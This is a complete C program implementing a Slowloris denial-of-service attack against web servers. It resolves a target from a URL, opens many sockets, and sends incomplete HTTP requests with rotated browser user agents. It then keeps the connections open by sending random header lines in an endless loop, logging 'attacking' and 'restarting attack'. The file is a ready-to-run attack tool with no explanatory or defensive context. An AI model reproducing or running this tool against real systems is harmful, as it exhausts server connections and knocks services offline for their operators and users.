#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <netdb.h>
#include <unistd.h>
#include <regex.h>
#include <errno.h>
#include <pthread.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define RND (65 + (rand() % 26))

static const char *user_agents[] = {
	"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
	"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36 Edg/107.0.1418.26",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5113.212 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.58 Safari/537.36 Edg/102.0.1245.33",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.77 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (X11; CrOS aarch64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
};

const char *green()
{
	return "\033[0;32m";
}

const char *red()
{
	return "\033[1;31m";
}

const char *reset()
{
	return "\033[0m";
}

static void sigint_handler(int sig)
{
	static char msg[] = "See You Space Cowboy...\n";

	write(STDOUT_FILENO, msg, sizeof(msg));
	exit(1);
}

void send_payload(int sock, char *ip_str)
{
	char buffer[256] = { 0 };

	srand(time(NULL));
	sprintf(buffer, "GET /%c%c%c%c HTTP/1.1\r\n", RND, RND, RND, RND);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
	sprintf(buffer, "Host: %s\r\n", ip_str);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
	sprintf(buffer, "User-Agent: %s\r\n", user_agents[RND &
			(sizeof(user_agents)/sizeof(char *) - 1)]);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
	sprintf(buffer, "Content-Length: %d\r\n", RND);
	send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);

	if (errno)
		fprintf(stderr, "[!] ERRNO[%d]: %s in socket %d\n", errno,
			strerror(errno), sock);
}

int spam(int *sockets, int n_sockets)
{
	int FLAG = 0;
	char buffer[16] = { 0 };

	srand(time(NULL));

	for (int i = 0; i < n_sockets; ++i) {
		sprintf(buffer, "X-a: %c%c%c%c\r\n", RND, RND, RND, RND);
		if ((send(sockets[i], buffer, strlen(buffer), MSG_NOSIGNAL) < 0)) {
			fprintf(stderr, "%s[!] server is not vulnerable to SlowLoris Attack.\n%s",
					red(), reset());
			FLAG = 1;
			break;
		}
	}

	return FLAG;
}

void get_address(char *target_name, struct sockaddr_in *ptr)
{
	struct addrinfo hints, *res, *p;

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	if ((getaddrinfo(target_name, NULL, &hints, &res) == 0)) {
		for (p = res; p != NULL; p = p->ai_next) {
			if (p->ai_family == AF_INET) {
				struct sockaddr_in *aux =
					(struct sockaddr_in *) p->ai_addr;
				memcpy(&ptr->sin_addr.s_addr,
						&(aux->sin_addr),
						sizeof(unsigned int));
			}
		}
	} else {
		inet_pton(AF_INET, target_name,
				(void *) (&ptr->sin_addr.s_addr));
	}

	freeaddrinfo(res);
}

void options(int argc, char *argv[], char **url, uint16_t *port, int32_t *n_sockets,
		int32_t *t_sleep)
{
	int opt;

	while ((opt = getopt(argc, argv, ":u:p:s:t:-:h")) != -1) {
		switch (opt) {
		case 'u':
			*url = optarg;
			break;
		case 'p':
			*port = atoi(optarg);
			break;
		case 's':
			*n_sockets = atoi(optarg);
			break;
		case 't':
			*t_sleep = atoi(optarg);
			break;
		case ':':
			fprintf(stderr, "%sOption -%c requires an argument.\n%s",
					red(), optopt, reset());
			exit(EXIT_FAILURE);
		case '?':
			fprintf(stderr, "%sUnknown option: -%c\n%s", red(),
					optopt, reset());
			exit(EXIT_FAILURE);
		case '-':
			if (strcmp(optarg, "url") == 0) {
				*url = argv[optind];
				optind++;
			} else if (strcmp(optarg, "port") == 0 || strcmp(optarg, "p") == 0) {
				*port = atoi(argv[optind]);
				optind++;
			} else if (strcmp(optarg, "sockets") == 0 || strcmp(optarg, "s") == 0) {
				*n_sockets = atoi(argv[optind]);
				optind++;
			} else if (strcmp(optarg, "sleep") == 0 || strcmp(optarg, "t") == 0) {
				*t_sleep = atoi(argv[optind]);
				optind++;
			} else if (strcmp(optarg, "help") == 0) {
				fprintf(stdout, "%sUsage: %s --ip <ip_address> -p <port_number> -s <num_sockets> --help\n%s",
						green(), argv[0], reset());
				exit(EXIT_SUCCESS);
			} else {
				fprintf(stderr, "Unknown option --%s. Use --help for help.\n", optarg);
				exit(EXIT_FAILURE);
			}
			break;
		case 'h':
			fprintf(stdout, "%sUsage: %s --ip <ip_address> -p <port_number> -s <num_sockets> --help\n%s",
					green(), argv[0], reset());
			exit(EXIT_SUCCESS);
		default:
			fprintf(stderr, "%sUsage: %s --ip <ip_address> -p <port_number> -s <num_sockets> --help\n%s",
					green(), argv[0], reset());
			exit(EXIT_FAILURE);
		}
	}

	if (!*url) {
		fprintf(stderr, "%sUnkown url%s\n", red(), reset());
		exit(EXIT_FAILURE);
	}
}

char *extract_domain(char *url)
{
	const char *pattern = "https?://([^/]+).*";
	regex_t regex;
	regmatch_t matches[2];
	int status = regcomp(&regex, pattern, REG_EXTENDED);

	if (status) { return url; }

	status = regexec(&regex, url, 2, matches, 0);

	if (status) {
		regfree(&regex);
		return url;
	}

	size_t match_length = matches[1].rm_eo - matches[1].rm_so;
	char* result = (char*)malloc(match_length + 1);

	if (!result) {
		regfree(&regex);
		return url;
	}

	snprintf(result, match_length + 1, "%.*s", (int) match_length,
			url + matches[1].rm_so);
	regfree(&regex);

	return result;
}

int main(int argc, char *argv[])
{
	signal(SIGINT, sigint_handler);

	int32_t n_sockets = 32, launch = 1, t_sleep = 5;
	uint16_t port = 80;
	char *url = NULL, ip_str[INET_ADDRSTRLEN] = { 0 };
	struct sockaddr_in target;

	memset(&target, 0, sizeof(struct sockaddr_in));

	options(argc, argv, &url, &port, &n_sockets, &t_sleep);

	url = extract_domain(url);

	target.sin_family = AF_INET;
	target.sin_port = htons(port);
	get_address(url, &target);

	inet_ntop(AF_INET, (void *) &target.sin_addr.s_addr, ip_str,
			sizeof(ip_str));

	printf("%s[i] attacking on address: %s\n", green(), ip_str);
	printf("[i] port %d\n", port);
	printf("[i] number of connections %d\n", n_sockets);
	printf("[i] sleep mode is %d sec %s\n\n\n", t_sleep, reset());

	int *sockets = (int *) malloc(n_sockets * sizeof(int));

	if (!sockets) {
		printf("[!] problem in memory allocation\nExiting...\n");
		return EXIT_FAILURE;
	}

	for (int i = 0; i < n_sockets; ++i) {
		sockets[i] = socket(AF_INET, SOCK_STREAM, 0);

		if (sockets[i] == -1) {
			fprintf(stderr, "%s[!] can not create socket %d.\n%s",
					red(), i + 1, reset());
			free(sockets);
			return EXIT_FAILURE;
		}

		printf("%s[i] created socket number %d.%s\n",
				green(), i + 1, reset());

		if (connect(sockets[i], (struct sockaddr *) &target,
					sizeof(target)) == -1) {
			printf("%s[!] ERRNO: %s\n%s", green(),
					strerror(errno), reset());
			free(sockets);
			return EXIT_FAILURE;
		}
		send_payload(sockets[i], ip_str);
	}

	while (1) {
		printf("%s[i] launched number %d completed.\n%s",
				green(), launch++, reset());
		printf("%s[i] sleeping for %02d seconds.\n%s",
				green(), t_sleep, reset());
		if (spam(sockets, n_sockets)) { break; }
		printf("%s[i] restarting attack.\n%s", green(), reset());
		sleep(t_sleep);
	}

	free(sockets);

	return EXIT_SUCCESS;
}
